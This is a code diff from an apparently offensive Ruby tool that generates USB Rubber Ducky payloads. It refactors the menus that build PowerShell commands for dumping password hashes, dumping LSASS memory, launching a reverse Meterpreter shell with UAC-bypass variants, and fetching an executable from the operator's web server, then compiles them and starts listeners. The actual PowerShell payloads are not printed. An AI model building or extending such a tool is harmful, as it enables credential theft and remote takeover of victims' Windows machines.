@@ -9,16 +9,17 @@ include MainCommands
 include MsfCommands
 include Menu
 include DuckySetUp
+include PowershellCommands
 def server(attack)
   @server_setup = ServerSetUp.new
   host = @server_setup.get_host
   if attack == 'hash_dump'
   port = @server_setup.get_port
-    powershell_command = PowershellCommands.new.hash_dump(host,port)
+    powershell_command = powershell_hash_dump(host,port)
     return host,port,powershell_command
   elsif attack == 'lsass_dump'
   port = @server_setup.get_port
-    powershell_command1,powershell_command2 = PowershellCommands.new.lsass_dump(host,port)
+    powershell_command1,powershell_command2 = powershell_lsass_dump(host,port)
     return host,port,powershell_command1,powershell_command2
   elsif attack == 'wget'
     file_path = Readline.readline("#{get_input('Enter full path to executable: ')} ", true)
@@ -33,7 +34,7 @@ def server(attack)
     end
     print_info("Copying #{file_path} to '/var/www/'\n")
     FileUtils.copy(file_path,'/var/www/')
-    powershell_command = PowershellCommands.new.wget_powershell(host,executable)
+    powershell_command = powershell_wget_powershell(host,executable)
     return powershell_command
   end
 end
@@ -42,7 +43,7 @@ def meterpreter_setup
   host = server_setup.get_host
   port = server_setup.get_port
   shellcode = generate_shellcode(host,port)
-  powershell_command = PowershellCommands.new.reverse_meterpreter(shellcode)
+  powershell_command = powershell_reverse_meterpreter(shellcode)
   return powershell_command,host,port
 end
 def start_msf(host,port)
@@ -74,7 +75,7 @@ def case_main_menu
       print_error("Bad Choice")
       sleep(1)
       case_main_menu
-    end
+  end
 end
 def case_reverse_meterpreter_menu
   reverse_meterpreter_answer = reverse_meterpreter
@@ -84,21 +85,21 @@ def case_reverse_meterpreter_menu
       print_info("Creating Text File!\n")
       meterpreter_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_reverse_meterpreter
+      compile_ducky(@@reverse_meterpreter_file)
       start_msf(host,port)
     when '2'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       meterpreter_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_reverse_meterpreter
+      compile_ducky(@@reverse_meterpreter_file)
       start_msf(host,port)
 	  when '3'
       powershell_command,host,port = meterpreter_setup
       print_info("Creating Text File!\n")
       meterpreter_low(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_reverse_meterpreter
+      compile_ducky(@@reverse_meterpreter_file)
       start_msf(host,port)
     when '99'
       case_main_menu
@@ -106,7 +107,7 @@ def case_reverse_meterpreter_menu
       print_error("Bad Choice")
       sleep(1)
       case_reverse_meterpreter_menu
-    end
+  end
 end
 def case_dump_hashes_menu
   attack = 'hash_dump'
@@ -117,14 +118,14 @@ def case_dump_hashes_menu
       print_info("Creating Text File!\n")
       hash_dump_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_hash_dump
+      compile_ducky(@@hash_dump_file)
       start_hash_server(port)
     when '2'
       host,port,powershell_command = server(attack)
       print_info("Creating Text File!\n")
       hash_dump_no_uac(encode_command(powershell_command))
       print_info("Compiling Text to Bin!\n")
-      compile_hash_dump
+      compile_ducky(@@hash_dump_file)
       start_hash_server(port)
     when '99'
       case_main_menu
@@ -132,7 +133,7 @@ def case_dump_hashes_menu
       print_error("Bad Choice")
       sleep(1)
       case_dump_hashes_menu
-    end
+  end
 end
 def case_dump_lsass_menu
   attack = 'lsass_dump'
@@ -143,14 +144,14 @@ def case_dump_lsass_menu
       print_info("Creating Text File!\n")
       lsass_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
-      compile_hash_dump
+      compile_ducky(@@lsass_dump_file)
       start_lsass_server(port)
     when '2'
-      host,port,powershell_command = server(attack)
+      host,port,powershell_command1,powershell_command2 = server(attack)
       print_info("Creating Text File!\n")
       lsass_no_uac(encode_command(powershell_command1),encode_command(powershell_command2))
       print_info("Compiling Text to Bin!\n")
-      compile_hash_dump
+      compile_ducky(@@lsass_dump_file)
       start_lsass_server(port)
     when '99'
       case_main_menu
@@ -158,7 +159,7 @@ def case_dump_lsass_menu
       print_error("Bad Choice")
       sleep(1)
       case_dump_lsass_menu
-    end 
+  end 
 end
 def case_wget_menu
   attack = 'wget'
@@ -166,23 +167,20 @@ def case_wget_menu
   wget_answer = powershell_wget
   case wget_answer
     when '1'
-     powershell_command,executable = server(attack)
-     print_info("Creating Text File!\n")
-     wget_uac(encode_command(powershell_command))
-     print_info("Compiling Text to Bin!\n")
-     compile_wget
+      powershell_command,executable = server(attack)
+      print_info("Creating Text File!\n")
+      wget_uac(encode_command(powershell_command))
+      compile_ducky(@@wget_file)  
     when '2'
-     powershell_command,executable = server(attack)
-     print_info("Creating Text File!\n")
-     wget_no_uac(encode_command(powershell_command))
-     print_info("Compiling Text to Bin!\n")
-     compile_wget
+      powershell_command,executable = server(attack)
+      print_info("Creating Text File!\n")
+      wget_no_uac(encode_command(powershell_command))
+      compile_ducky(@@wget_file)  
     when '3'
-     powershell_command,executable = server(attack)
-     print_info("Creating Text File!\n")  
-     wget_low(encode_command(powershell_command))
-     print_info("Compiling Text to Bin!\n")
-     compile_wget
+      powershell_command,executable = server(attack)
+      print_info("Creating Text File!\n")  
+      wget_low(encode_command(powershell_command))
+      compile_ducky(@@wget_file)  
     when '99'
       case_main_menu
     else
